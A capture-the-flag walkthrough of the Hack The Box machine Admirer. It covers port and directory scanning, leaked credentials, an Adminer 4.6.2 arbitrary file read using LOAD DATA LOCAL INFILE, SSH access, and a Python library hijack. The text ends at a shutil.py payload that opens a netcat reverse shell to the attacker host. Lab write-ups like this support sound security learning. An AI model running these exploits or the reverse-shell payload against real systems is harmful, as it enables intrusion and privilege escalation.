![Admirer_info_card](https://user-images.githubusercontent.com/110210595/189752052-86e6b3f2-340e-44d2-b523-291069d596c8.png)

Started off with a nmap scan `nmap -Pn -T5 -sV -sC -A -p- -oN admirer_nmap.txt 10.10.10.187`
We get back the following results.<br>

![nmap_results](https://user-images.githubusercontent.com/110210595/189752262-bce55593-cd17-4e4e-8b1d-15d6731f4755.PNG)

We see port 21 ftp version <em><strong>vsftpd 3.0.3</em></strong><br>
port 80 with a http title of Admirer and a directory of /admin-dir<br>
and a <em><strong>robots.txt</em></strong><br>

I first check out the ftp login to see if there is anonymous access. I use `ftp 10.10.10.187`<br>
use the name anonymous and it gives me permission denied.<br>

![ftp_anonymous](https://user-images.githubusercontent.com/110210595/189752459-21bca6f3-cd4c-4c59-9d4f-03f94e281c69.PNG)

After that I do a lovely google search against ftp vsftpd 3.0.3 exploit nothing good comes up besides denial of service, which is something we don't want to do.<br>
We want this machine up and running so we can find a way in. Not to bring it down.<br>
I also do a searchsploit against vsftpd 3.0.3 and get nothing good back either.<br>

![searchsploit_vsftpd](https://user-images.githubusercontent.com/110210595/189752587-ccacd818-26e1-480e-9ae5-6504df5b8b3a.PNG)

Going to the website 10.10.10.187 It looks to be a webpage with arranged photos. When you click on them, they pop out and take focus. They're titled.<br>
There is an About section you can click on that will open up a contact page to get in touch with the devs.<br>

![website_homepage](https://user-images.githubusercontent.com/110210595/189753503-e62239d2-97e2-4620-b074-5fae098dcab7.PNG)

I fill out the required fields with my name and a test@gmail.com along with a message of hello everyone. I click send. Just brings me back to the original 10.10.10.187.
I will open up burp and capture a request and see what happens. I get the following results.<br>

![burp_results](https://user-images.githubusercontent.com/110210595/189753661-7df36562-8f76-491f-bc5c-f73895730852.PNG)

There are variables of "name" "email" "message"
Multiverse by HTML5 UP
html5up.net | <em><strong>@ajlkn</em></strong>
<em><strong>ajlkn</em></strong> could be a user some where. I'll keep note of this.
There also seemed to be a lot of extra content that wasn't on the original page.
I found a few directories
images/fulls
images/thumbs
and a <!--scripts --> section<br>
<!-- Scripts --><br>
<script src="assets/js/jquery.min.js"></script><br>
<script src="assets/js/jquery.poptrox.min.js"></script><br>
<script src="assets/js/browser.min.js"></script><br>
<script src="assets/js/breakpoints.min.js"></script><br>
<script src="assets/js/util.js"></script><br>
<script src="assets/js/main.js"></script><br>

after this I go check out the <em><strong>robots.txt</em></strong> file<br>

Don't get much<br>
User-agent: *<br>
#This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo<br>
Disallow: /admin-dir<br>

But <em><strong>"waldo"</em></strong> could be another username some where. I'll keep note of this as well.<br>
Nothing in the View-Source as well.<br>

With Wappalyzer I could see the<br>
Web servers = <em><strong>Apache 2.4.25</em></strong><br>
JavaScript libraries = <em><strong>jQuery 3.4.1</em></strong><br>
Operating systems = <em><strong>Debian</em></strong><br>

I'm going to run FFuF on 10.10.10.187 and 10.10.10.187/admin-dir

`ffuf -c -u http://10.10.10.187/FUZZ -w /home/Shellshock/Documents/wordlists/directory-list-2.3-medium.txt:FUZZ -t 60 -o ffuf_admirer_results -e .txt,.php,.zip`
I got the following results back from 10.10.10.187:

/assets, /images and we knew the robots.txt was there already from the nmap scan earlier.<br>

![ffuf_admir_results](https://user-images.githubusercontent.com/110210595/189754979-2630aa88-5da2-432c-8490-80edce6e1894.PNG)

Not much here. The assets and images locations are both forbidden. Next up.<br>

`ffuf -c -u http://10.10.10.187/admin-dir/FUZZ -w /home/Shellshock/Documents/wordlists/directory-list-2.3-medium.txt:FUZZ -t 60 -o ffuf_admirer-admin-dir_results -e .txt,.php,.zip`
I got the following results back from 10.10.10.187/admin-dir:ffuf -c -u http://10.10.10.187/admin-dir/FUZZ -w /home/Shellshock/Documents/wordlists/directory-list-2.3-medium.txt:FUZZ -t 60 -o ffuf_admirer-admin-dir_results -e .txt,.php,.zip
I got the following results back from 10.10.10.187/admin-dir:<br>


![ffuf_admir-dir_results](https://user-images.githubusercontent.com/110210595/189755577-9dd99e03-892f-4b33-a87f-f5be613254ad.PNG)

a <em><strong>contacts.txt</em></strong> and a <em><strong>credentials.txt</em></strong><br>
exactly what that robots file mentioned. Personal contacts and creds.<br>

First up is the <em><strong>contacts.txt</em></strong>. I go to 10.10.10.187/admin-dir/contacts.txt<br>
I get back the following page:<br>

![adminer_contacts_txt_results](https://user-images.githubusercontent.com/110210595/189756031-14dc20ce-46a7-44f0-a796-e96c31eaefdc.png)

There is an admins / developers / designers sections. I take notes of these and write them down.<br>
Next us is the credentials.txt<br>
I get the following results:<br>

![adminer_credentials_txt_results](https://user-images.githubusercontent.com/110210595/189756115-d2ee240d-a9a9-4990-b1d2-7aec49af6c07.png)

There we go. Looks like we have a FTP account that we can now log into. Remember earlier, anonymous wasn't allowed. I write down the other accounts and passwords as well.<br>
`ftp 10.10.10.187`<br>
username: <em><strong>ftpuser</em></strong><br>
password: <em><strong>%n?4Wz}R$tTF7</em></strong><br>

I don't see any other directories here. All I see is a <em><strong>dump.sql</em></strong> file and a <em><strong>html.tar.gz</em></strong>
I use `get dump.sql` and `get html.tar.gz`<br>

The <em><strong>dump.sql</em></strong> is a sql file. I open it an examine its contents. I see a database named <em><strong>admirerdb</em></strong> using Server <em><strong>version 10.1.41-MariaDB-0+deb9u1</em></strong>
it also list the structure of tables. Good stuff here.<br>

Opening the html.tar.gz we get some folders and files in here. Most noticeably is the <em><strong>w4ld0s_s3cr3t_d1r folder</em></strong>. Before I go into that I check out the <em><strong>index.php</em></strong> file and we see some more credentials.<br>

$servername = "localhost";<br>
$username = "waldo";<br>
$password = "]F7jLHw:*G>UPrTo}~A"d6b";<br>
$dbname = "admirerdb";<br>
$conn = new mysqli($servername, $username, $password, $dbname<br>

I go into the Utility Scripts folder and there are four files. Nothing interesting in the other three files but in the phptest.php file there is 
$servername = "localhost";<br>
$username = "waldo";<br>
$password = "Wh3r3_1s_w4ld0?";<br>
There was also a note on the bottom of this file.<br>
// TODO: Finish implementing this or find a better open source alternative<br>
Whoever the dev was didn't finish it and maybe using an insecure application.<br>

With everything that we found I looked back and thought about running ffuf against these two new folders that we found thanks to html.tar.gz<br>
<em><strong>utility-scripts</em></strong><br>
<em><strong>w4ld0s_s3cr3t_d1r</em></strong><br>

I use `ffuf -c -u http://10.10.10.187/utility-scripts/FUZZ -w /home/Shellshock/Documents/wordlists//directory-list-2.3-medium.txt:FUZZ -t 60 -o fuff_admirer/utility-scripts/_results -e .txt,.php,.zip,.gz`
I added that .gz after we found that html.tar.gz 
Didn't find anything here. I was stuck at this point. I found credentials but no where to plug them into. And my scans weren't picking anything up. I went to google to try and find some help, a write up. This is perfectly fine, don't think you will ever know how to do everything and know everything. There will be times when you need help. Just don't be to proud to ask. I went to ippsec. You can find his YouTube channel here. https://www.youtube.com/c/ippsec I like his videos because he will go through every step as if you don't know anything at all about the machine. I've seen other channels were they go straight through the machine as if the process was known. I learned a lot from this video. I learned the power of a good wordlist is crucial. One wordlist found the directory where as the other wordlist did not. It is also important to look at more than one writeup for the same machine, because everyone will have different methods to complete the box, the more methods you learn the more you can broaden your toolset. Lets get back to the box now.

I took his advice and used a different wordlist. I used the one that he used. /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
`ffuf -c -u http://10.10.10.187/utility-scripts/FUZZ  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -e .txt,.php,.zip,.html,.rar -t 60 | tee ./adminer_utility-scripts_fuzz_results.txt`

![ffuf_utility-scripts_results](https://user-images.githubusercontent.com/110210595/189809630-8ee42688-4257-45f1-8b58-1f47a811e8b6.png)

we found the adminer.php directory. Navigating to http://10.10.10.187/utility-scripts/adminer.php brings us to an Adminer 4.6.2 MySQL login page.

![adminer_php_login](https://user-images.githubusercontent.com/110210595/189809738-9f8e7628-0c37-4baf-ad99-126171e5b1d9.PNG)

This was another tricky part that I haven't done before. Which was sending the Adminer mysql requests to our attacking machines mysql. 
Ippsec taught this very well.<br>

First you have to restart the mysql service. `sudo service mysql restart`<br>
Then, you start the mysql service. `sudo service mysql start`<br>
Now you can start the MariaDB with `sudo mysql`<br>
Create a database, you can name it anything you want.<br>
`create database Shellshockdb;`<br>
Create a user for this database that will connect to the victim machines database. This is where were funneling the request and information to our machine.
You IDENTIFY with a password of your choice..<br>
`create user 'Shellshock'@'10.10.10.187' IDENTIFIED BY 'DontExploitMePls';`<br>
Grant all privileges to the user in the given database that we just created.<br>
`GRANT ALL on Shellshockdb.* TO 'Shellshock'@'10.10.10.187';`
Flush privileges will reload the grant tables. This is similar to resetting the settings after changing the rules with the GRANT ALL. This will make them take effect.
`FLUSH PRIVILEGES;`<br>
I was told to have the password as DontExploitMePls because your machine will be hosted up for anyone to connect to. Meaning anyone else doing this box may see your machine connected to or communicated with it on port 3306. This way If they crack the password to the account they'll hopefully be nice and not try to exploit you while you're doing this machine. 

Now this is <strong>VERY IMPORTANT</strong>. We have to change the bind address in the <strong>/etc/mysql/mariadb.conf.d/50-server.cnf</strong> file. This way the admirerdb will connect back to us.<br>
<strong>YOU MUST</strong> remember to change this back to the original 127.0.0.1. Otherwise your machine can be vulnerable to anyone else who doing this machine.

![bind_address](https://user-images.githubusercontent.com/110210595/189810134-4abc5d04-ef9a-4089-8b8a-cab051a01aca.PNG)

<strong>REMEMBER CHANGE THIS BACK TO 127.0.0.1</strong> when you're done with the machine.<br>

Ok. With all this set up, we will be able to log in and connect to the database.<br>

![adminer_login_credentials](https://user-images.githubusercontent.com/110210595/189810278-b2391956-c55a-4dba-83f1-aadc45d24bc2.PNG)

Server:attacking_machine_ip or the bind-address you set in the mariadb conf file.<br>
Username:Username we created earlier - Shellshock<br>
Password:Password we IDENTIFIED with earlier - DontExploitMePls<br>
Database:We created earlier - Shellshockdb<br>

![adminer_login_success](https://user-images.githubusercontent.com/110210595/189810359-98e549c5-b8e3-489d-9256-95d32bf24601.PNG)

from here you can google adminer php exploit. This is running on <em><strong>adminer 4.6.2</em></strong>
google will bring up a file disclosure vulnerability. `LOAD DATA INFILE` This is the sql command we will use to access files.<br>
https://podalirius.net/en/articles/writing-an-exploit-for-adminer-4.6.2-arbitrary-file-read-vulnerability/<br> 
or from https://www.youtube.com/c/ippsec both will show the exploit in progress.<br>
We have to create a table to load the file into that way we have a place to store it and we can read it.<br>
I went into the create table option and named it Shock. I named the column info.<br>

![shock_table](https://user-images.githubusercontent.com/110210595/189810505-69e79b85-a9c0-4636-9dbe-7ccd20e51227.PNG)

we try to do `LOAD DATA LOCAL INFILE '/etc/hosts' INTO TABLE Shock FIELDS TERMINATED BY "\n"`<br>

but we get an error: open_basedir restriction in effect. Unable to open file.<br>
google searching tells us that this is a security setting in the configuration file. This way we can't open and access any file we want.<br>
opening the <em><strong>info.php(php configuration file)</em></strong> file in utility-scripts shows that were only allowed to open files in <em></strong>/var/www/html</em></strong><br>
There is one file in the html folder called <em><strong>index.php</em></strong>

I use `LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE Shock FIELDS TERMINATED BY "\n"`
and says 123 rows affected.<br>

I click on warnings and it shows<br>

![index_php_results](https://user-images.githubusercontent.com/110210595/189810860-0ca59a62-9eae-4d6b-a6bd-f406fa77868b.PNG)

which is our third set of credentials for waldo. 

waldo : ]F7jLHw:*G>UPrTo}~A"d6b
waldo : Wh3r3_1s_w4ld0?
waldo : &<h5b~yK3F#{PaPB&dA}{H>

With these credentials I try to SSH into waldo<br> 
ssh waldo@10.10.10.187<br>

![ssh_success](https://user-images.githubusercontent.com/110210595/189810985-bf1c7e7f-864a-45a9-a1b6-8432929e6f0a.png)

We got ssh access!<br>

![COWABUNGA](https://user-images.githubusercontent.com/110210595/189811060-b0292346-d7c5-460f-abe6-03311819b901.png)

Even better, we `ls` and instantly get a <em><strong>user.txt</em></strong flag.

![Mikey_being_a_savage](https://user-images.githubusercontent.com/110210595/189811176-4242071c-ed25-459e-b09c-ed082c04153d.png)

Now I start off with `sudo -l` to see what sudo permissions we have. <em><strong>(ALL) SETENV: /opt/scripts/admin_tasks.sh</em></strong><br>
I `cd /opt/scripts/` and there are two files here:<br>
admin_tasks.sh - backup.py
I do `ls -la` and we don't have any permissions. We can only read them.<br>
<em><strong>cat admin_tasks.sh</em></strong><br>
It seems to be backing up passwords from /etc/passwd, /etc/shadow, to a passwd.bak and shadow.bak. From backup.py<br>

I now do cat backup.py

![back_py_results](https://user-images.githubusercontent.com/110210595/189811516-8ad3969c-0d41-4bf6-9da6-b534244e8368.PNG)

It is doing an import from make_archive using a script called shutil.py<br> 
I try to write the shutil.py script with nano to get a reverse shell back in the /opt/scripts/ directory but we get permission denied when trying to save. So I go to /tmp and write it there. I use the follow script from ippsec.<br>

`nano shutil.py`

```
import os, socket, subprocess

def make_archive(a , b, c):
os.system("nc -c bash 10.10.14.14 9001")
```
